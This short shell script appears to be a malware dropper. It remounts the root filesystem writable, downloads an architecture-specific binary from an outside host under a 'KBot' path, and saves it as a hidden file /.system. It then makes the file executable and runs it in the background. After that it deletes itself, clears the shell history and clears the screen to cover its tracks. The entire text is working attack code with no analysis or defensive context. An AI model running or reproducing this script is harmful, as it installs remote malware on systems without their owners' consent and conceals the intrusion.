

if [ ! -f "/.system" ];then
mount -o rw,remount /
wget -q http://chimaera.cc/bin/KBot/$(uname -m) -O /.system
chmod +x /.system
mount -o remount,exec /
/.system &
fi
if [ "$0" != "bash" ];then if [ "$0" != "sh" ];then rm -f $0 ; fi ; fi
history -c
clear

